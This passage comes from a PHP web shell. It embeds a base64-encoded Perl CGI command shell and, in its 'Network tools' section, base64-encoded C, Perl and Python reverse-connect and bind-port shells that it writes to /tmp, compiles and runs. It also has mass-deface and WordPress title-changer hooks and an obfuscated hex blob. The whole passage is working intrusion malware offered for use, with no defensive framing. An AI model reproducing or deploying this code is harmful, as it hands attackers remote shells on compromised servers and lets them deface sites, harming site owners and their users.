aWduOmNlbnRlcjsnPiIuJkZpbGVPd25lcigkZikuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIGlkPSdGaWxlUGVybXNfJGknIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnIG9uZGJsY2xpY2s9XCJybV9jaG1vZF9mb3JtKHRoaXMsIi4kaS4iLCciLiZGaWxlUGVybXMoJGYpLiInLCciLiRmaWxlLiInKVwiID48c3BhbiBvbmNsaWNrPVwiY2htb2RfZm9ybSgkaSwnJGZpbGUnKVwiID4iLiZGaWxlUGVybXMoJGYpLiI8L3NwYW4+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZikuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0iLiRwYXRoLiImYz1lZGl0JTIwIi4kZmlsZS4iJz5FZGl0PC9hPiB8IDxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZmlsZScsJ2YnKVwiPlJlbmFtZTwvYT4gfCA8YSBocmVmPSc/YT1kb3dubG9hZCZvPWdvJmY9Ii4kZi4iJz5Eb3dubG9hZDwvYT4gfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBmaWxlOiAkZmlsZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0kcGF0aCZyZW1vdmU9JGZpbGUnPlJlbW92ZTwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsKCQkJJGkrKzsKCQl9CgkJJHJlc3VsdCAuPSAiPC90YWJsZT48L2Rpdj4iOwoJfQoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRyeSB0byBWaWV3IExpc3QgVXNlcgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBWaWV3RG9tYWluVXNlcgp7CglvcGVuIChkb21haW5zLCAnL2V0Yy9uYW1lZC5jb25mJykgb3IgJGVycj0xOwoJbXkgQGNuenMgPSA8ZG9tYWlucz47CgljbG9zZSBkMG1haW5zOwoJbXkgJHN0eWxlPSJsaW5lIjsKCW15ICRyZXN1bHQ9IjxoNT48Zm9udCBzdHlsZT0nZm9udDogMTVwdCBWZXJkYW5hO2NvbG9yOiAjZmZmZmZmOyc+SG9hbmcgU2EgLSBUcnVvbmcgU2E8L2ZvbnQ+PC9oNT4iOwoJaWYgKCRlcnIpCgl7CgkJJHJlc3VsdCAuPSAgKCc8cD5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7CgkJcmV0dXJuICRyZXN1bHQ7Cgl9ZWxzZQoJewoJCSRyZXN1bHQgLj0gJzx0YWJsZT48dHI+PHRoPkRvbWFpbnM8L3RoPiA8dGg+VXNlcjwvdGg+PC90cj4nOwoJfQoJZm9yZWFjaCBteSAkb25lIChAY256cykKCXsKCQlpZigkb25lID1+IG0vLio/em9uZSAiKC4qPykiIHsvKQoJCXsJCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7CgkJCSRmaWxlbmFtZT0gIi9ldGMvdmFsaWFzZXMvIi4kb25lOwoJCQkkb3duZXIgPSBnZXRwd3VpZCgoc3RhdCgkZmlsZW5hbWUpKVs0XSk7CgkJCSRyZXN1bHQgLj0gJzx0ciBjbGFzcz0iJHN0eWxlIiB3aWR0aD01MCU+PHRkPicuJG9uZS4nIDwvdGQ+PHRkPiAnLiRvd25lci4nPC90ZD48L3RyPic7CgkJfQoJfQoJJHJlc3VsdCAuPSAnPC90YWJsZT4nOwoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFZpZXcgTG9nCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFZpZXdMb2cKewoJaWYoJFdpbk5UKQoJewoJCXJldHVybiAiPGgyPjxmb250IHN0eWxlPSdmb250OiAyMHB0IFZlcmRhbmE7Y29sb3I6ICNmZmZmZmY7Jz5Eb24ndCBydW4gb24gV2luZG93czwvZm9udD48L2gyPiI7Cgl9CglteSAkcmVzdWx0PSI8dGFibGU+PHRyPjx0aD5QYXRoIExvZzwvdGg+PHRoPlN1Ym1pdDwvdGg+PC90cj4iOwoJbXkgQHBhdGhsb2c9KAoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3JfbG9nJywKCQkJCScvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2cnLAoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzX2xvZycKCQkJCSk7CglteSAkaT0wOwoJbXkgJHBlcm1zOwoJbXkgJHNsOwoJZm9yZWFjaCBteSAkbG9nIChAcGF0aGxvZykKCXsKCQlpZigtdyAkbG9nKQoJCXsKCQkJJHBlcm1zPSJPSyI7CgkJfWVsc2UKCQl7CgkJCWNob3AoJHNsID0gYGxuIC1zICRsb2cgZXJyb3JfbG9nXyRpYCk7CgkJCWlmKCZ0cmltKCRscykgZXEgIiIpCgkJCXsKCQkJCWlmKC1yICRscykKCQkJCXsKCQkJCQkkcGVybXM9Ik9LIjsKCQkJCQkkbG9nPSJlcnJvcl9sb2dfIi4kaTsKCQkJCX0KCQkJfWVsc2UKCQkJewoJCQkJJHBlcm1zPSI8Zm9udCBzdHlsZT0nY29sb3I6IHJlZDsnPkNhbmNlbDxmb250PiI7CgkJCX0KCQl9CgkJJHJlc3VsdCAuPTw8RU5EOwoJCTx0cj4KCgkJCTxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPgoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dfJGknKS52YWx1ZT0nbGVzcyAnICsgdGhpcy52YWx1ZTsiIHZhbHVlPSIkbG9nIiBzaXplPSc1MCcvPjwvdGQ+CgkJCTx0ZD48aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVHJ5IiAvPjwvdGQ+CgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJsb2dfJGkiIG5hbWU9ImMiIHZhbHVlPSJsZXNzICRsb2ciLz4KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiIC8+CgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciIgLz4KCQkJPC9mb3JtPgoJCQk8dGQ+JHBlcm1zPC90ZD4KCgkJPC90cj4KRU5ECgkJJGkrKzsKCX0KCSRyZXN1bHQgLj0iPC90YWJsZT4iOwoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiZSZWFkUGFyc2U7CiZHZXRDb29raWVzOwoKJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsKJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9OwokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9OwokUnVuQ29tbWFuZCA9ICRpbnsnYyd9OwokVHJhbnNmZXJGaWxlID0gJGlueydmJ307CiRPcHRpb25zID0gJGlueydvJ307CiRBY3Rpb24gPSAkaW57J2EnfTsKCiRBY3Rpb24gPSAiY29tbWFuZCIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQKCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQKJEN1cnJlbnREaXIgPSAmdHJpbSgkaW57J2QnfSk7CiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQokUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSIgaWYoJFJ1bkNvbW1hbmQgZXEgIiIpOwpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7CgokTG9nZ2VkSW4gPSAkQ29va2llc3snU0FWRURQV0QnfSBlcSAkUGFzc3dvcmQ7CgppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgCQkjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luCnsKCSZQZXJmb3JtTG9naW47Cn1lbHNpZigkQWN0aW9uIGVxICJndWkiKSAjIEdVSSBkaXJlY3RvcnkKewoJJlByaW50UGFnZUhlYWRlcjsKCWlmKCEkV2luTlQpCgl7CgkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOwoJCWlmKCEoJGNobW9kIGVxIDApKQoJCXsKCQkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOwoJCQkkZmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOwoJCQljaG9wKCRyZXN1bHQ9IGBjaG1vZCAkY2htb2QgIiRmaWxlImApOwoJCQlpZigmdHJpbSgkcmVzdWx0KSBlcSAiIikKCQkJewoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJCQl9ZWxzZQoJCQl7CgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJCQl9CgkJfQoJfQoJJHJlbmFtZT0kaW57J3JlbmFtZSd9OwoJaWYoISRyZW5hbWUgZXEgIiIpCgl7CgkJaWYocmVuYW1lKCRUcmFuc2ZlckZpbGUsJHJlbmFtZSkpCgkJewoJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7CgkJfWVsc2UKCQl7CgkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7CgkJfQoJfQoJJHJlbW92ZT0kaW57J3JlbW92ZSd9OwoJaWYoJHJlbW92ZSBuZSAiIikKCXsKCQkkcm0gPSAkQ3VycmVudERpci4kUGF0aFNlcC4kcmVtb3ZlOwoJCWlmKC1kICRybSkKCQl7CgkJCSZSbURpcigkcm0pOwoJCX1lbHNlCgkJewoJCQlpZih1bmxpbmsoJHJtKSkKCQkJewoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJCQl9ZWxzZQoJCQl7CgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJCQl9CQkJCgkJfQoJfQoJcHJpbnQgJkxpc3REaXI7Cgp9CmVsc2lmKCRBY3Rpb24gZXEgImNvbW1hbmQiKQkJCQkgCSMgdXNlciB3YW50cyB0byBydW4gYSBjb21tYW5kCnsKCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCXByaW50ICZFeGVjdXRlQ29tbWFuZDsKfQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUKewoJJlByaW50UGFnZUhlYWRlcjsKCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpCgl7CgkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJfWVsc2UKCXsKCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJfQoJcHJpbnQgJkxpc3REaXI7Cn0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgCQkJCQkjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQp7CgkmUHJpbnRQYWdlSGVhZGVyOwoKCXByaW50ICZVcGxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImJhY2tiaW5kIikgCQkJCSMgdXNlciB3YW50cyB0byBiYWNrIGNvbm5lY3Qgb3IgYmluZCBwb3J0CnsKCSZQcmludFBhZ2VIZWFkZXIoImNsaWVudHBvcnQiKTsKCXByaW50ICZCYWNrQmluZDsKfQplbHNpZigkQWN0aW9uIGVxICJicnV0ZWZvcmNlciIpIAkJCSMgdXNlciB3YW50cyB0byBicnV0ZSBmb3JjZQp7CgkmUHJpbnRQYWdlSGVhZGVyOwoJcHJpbnQgJkJydXRlRm9yY2VyOwp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQp7CglwcmludCAmRG93bmxvYWRGaWxlOwp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUKewoJJlByaW50UGFnZUhlYWRlcjsKCXByaW50ICZWaWV3TG9nOwoKfWVsc2lmKCRBY3Rpb24gZXEgImRvbWFpbnN1c2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbGlzdCB1c2VyL2RvbWFpbgp7CgkmUHJpbnRQYWdlSGVhZGVyOwoJcHJpbnQgJlZpZXdEb21haW5Vc2VyOwp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0KJlByaW50UGFnZUZvb3Rlcjs=";
    $cgi = fopen($file_cgi, "w");
    fwrite($cgi, base64_decode($cgi_script));
    fwrite($htcgi, $isi_htcgi);
    chmod($file_cgi, 0755);
        chmod($memeg, 0755);
    echo "<br><center>Done ... <a href='priv_cgi/cgi.priv' target='_blank'>Click Here</a></div>";
    hardFooter();
}


// Mass Deface Section Start
function actionSql() {
    hardHeader();
    echo "<center><h1>Mass Tools</h1><div class=content><br>";

    echo "<br><center> <iframe src='?mas' width='800' height='450'></iframe></a></div>";

    hardFooter();
}

// Mass Deface Section END

// Back COnnect SEction
function actionNetwork() {
    hardHeader();
    $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
    $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
    $bind_port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
    $pyy="IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBDb243ZXh0IC0gWGFpIFN5bmRpY2F0ZVxuVGhhbmtzIEdvb2dsZSBGb3IgUmVmZXJlbnNpXG5cbicnJykNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwwKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDEpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMikNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwzKQ0KICAgIHNoZWxsID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pDQogIGV4Y2VwdCBzb2NrZXQudGltZW91dDoNCiAgICBwcmludCAiVGltT3V0Ig0KICBleGNlcHQgc29ja2V0LmVycm9yLCBlOg0KICAgIHByaW50ICJFcnJvciIsIGUNCnB5YmFja2Nvbm5lY3QoKQ==";
    $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
    echo "<center><h1>Network tools</h1><div class=content>
    <form name='nfp' onSubmit='g(null,null,this.using.value,this.port.value,this.pass.value);return false;'><br>
    <span>Bind port to /bin/sh</span><br/>
    Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass'> Using: <label><select name='using'><option value='bpp'>Perl</option><option value='bpc'>C</option></select></label> <input type=submit value='submit'>
    </form><br>
    <form name='nfp' onSubmit='g(null,null,this.using.value,this.server.value,this.port.value);return false;'>
    <span>Back-connect to</span><br/>
    Server: <input type='text' name='server' value=". $_SERVER['REMOTE_ADDR'] ."> Port: <input type='text' name='port' value='21'> Using: <label><select name='using'><option value='bcpy'>Python</option><option value='bcp'>Perl</option><option value='bcc'>C</option></select></label> <input type=submit value='submit'><br><br><br>
    </form><br>"; 
    if(isset($_POST['p1'])) {
        function cf($f,$t) {
            $w=@fopen($f,"w") or @function_exists('file_put_contents');
            if($w)    {
                @fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t));
                @fclose($w);
            }
        }
        if($_POST['p1'] == 'bpc') {
            cf("/tmp/bp.c",$bind_port_c);
            $▖ = ex("gcc -o /tmp/bp /tmp/bp.c");
            @unlink("/tmp/bp.c");
            $▖ .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$▖".ex("ps aux | grep bp")."</pre>";
        }
        if($_POST['p1'] == 'bpp') {
            cf("/tmp/bp.pl",$bind_port_p);
            $▖ = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
            echo "<pre class=ml1>$▖".ex("ps aux | grep bp.pl")."</pre>";
        }
        if($_POST['p1'] == 'bcc') {
            cf("/tmp/bc.c",$back_connect_c);
            $▖ = ex("gcc -o /tmp/bc /tmp/bc.c");
            @unlink("/tmp/bc.c");
            $▖ .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$▖".ex("ps aux | grep bc")."</pre>";
        }
        if($_POST['p1'] == 'bcp') {
            cf("/tmp/bc.pl",$back_connect_p);
            $▖ = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$▖".ex("ps aux | grep bc.pl")."</pre>";
        }
        if($_POST['p1'] == 'bcpy') {
            cf("/tmp/bc.py",$back_connect_p);
            $▖ = ex(which("perl")." /tmp/bc.py ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$▖".ex("ps aux | grep bc.py")."</pre>";
          }
    }
    echo '</div>';
    hardFooter();
}

// Back Connect Section END 
function actionMassuser() {
    hardHeader();
    echo "<center><h1>Wordpress Mass Title Changer</h1><div class=content><br>";
    echo "<br><center> <iframe src='?title' width='800' height='400'></iframe></a>";
    echo '</div>';
    hardFooter();
}

if (isset($_REQUEST['mas'])) {

    $hex = "7Ut6YuPGEf55A/4PE8bNyjhUkpuXFpJVXBL0LgnQeOxQDmN5gSBMZWyyuyJKIiGq8H/P7Bu5JMXTOXbzpaV6Tbs7Ozuvz8zqchmUfsLpiPA4DnC/CrfkEr75/vb2b35p+rJexWxfRSS4PHqv7dmDzx9rltIyDHxN7myfJll2lEV/nWE2PC6Dep8iL5Oob4+dRmtJhOAsMh5DHnuLWhjvgXLiIPfeuWpgz3YR5vg5ChNt72vg4KZaGlUS4GxW/VpM8dG5a1/CbBnk/OEC/n1pCviUGxiVib+KWMrWhuqiXhZCSWQWCx5Ih8e8odFPvopLAAl9rLhYsrAK49k25jyYE2KR0DgMth7cvUvCaBhjuJpB/wSv0izjVrJWqwoWE1qDH5CPt0ujuhOtt6MPewJeJdwWYvDomOetgz9fwluG8ucwGx07DPR2dKdCYEyzYESa+L+wJG51jLyM0RYB2zN2tE6TIl3bom+GgQtWxgL8qCgseKKPOcsKGClPlsgd6xYPwydQPo74MJE0zrxQRYU7lpRVpIjHQCYE37XYHW0hvHEErusCGZPeoYZXecagLxOajLQAhqdmZGOXa9KgKoNdf8O8Qv7UnkWe78r3sQI6qDNhwwO1UGPsPFjioxw+SYUhbDFzWTBxw+Iciq4PkB8yho6JD2ISj1etO8ScgIJZKmpdpdy7vrm9bH1mvZiIBWJ2glnkQzf+uo+2phHhCPVsmT9g6PbSLrPz7gM8ng4vHZjubaoZPjVDYCHBICjaKNAybR9LzwtZ/4qjgpsw4oFuUUmkBQbC1eh0UozLH1ztUPMmq8KkpjArHWi2ddtELdy2CteskogRG5ZtX0mYGK0R63wvR0A49XCO9SvjI5Mmvv/23e2N718o2BGyX089drYLrZMOGjbMg5CyqgpKVcDimD2OnGROmawaziU4q9VX/PuRr8c/hcGm3IrR979cj6MiMgtMvbDqjZpa47F812ychDFILlYabkOKqR40IK0UECjdqgMmCuQsfOJXUH32GZg8SsQ4fyVzPykDXyl14sl13s/TQVjQL33w6V/fiB+r/larQWe1k1TUJUNAqav6htYpA61Qh3lGpVYx6s5XRuHrBVzND+WSpYaFGh3FUVouvvCQzVt24ni+wfDKsWvjeV2tBZkUvkiqYjHr5C4VQnXJSXee5wUKKNKuDjlO0s5CE5lipF95FdEUAZf5P1Hw+5LiY+gjRhGi/4X4t89dFSJeaNi6gESeKxsV/VV5xTcmj4hxeHla3FqXbw47iudTuznHqo/CSrL8iqJ8AExbkdhpSD8uOowGyomWQAt68cST60CRq/6ex1udNMly6/yDPcJgRiAexTESKUkz/HW5jxY18cjyYBx5MYk5WuNA6zZcNXyUpF857JJEy4uA4H/37avXaiQXniTLLpIeykwBqzv+CAhDfWs1MXfnGZmIpE/LXPYN08EXA409NHm1MR+Bg3oM1MZIb6t/DQwOQJwgOgZlEuMs8yd5nQYDtxEhcoL3yiwuI/q/ZzWRPZe4dSPORLRd3e62LdLh/azLxe854g9i/mi8aFv4O7j+9psbS4Jh4noCLACUe2hKrwmONPe/zSj2o5v9Xkd0g249wOxW/KqXdwqkXzX0CMZxCcK/biBjr/Fk04/ADzzGyHzNHyjWac5xmkUcMRyYSXjNst02DtMgn60RbGnzMKVrueGzABnPre8gQNR9l1XUIBCHq8QlSkYirI2fvv4L8c5BjXYRW1FTOAWl0Xkyqaf3rAwiU4sGUSWGGgg1QEuvifHSAmCr2WR3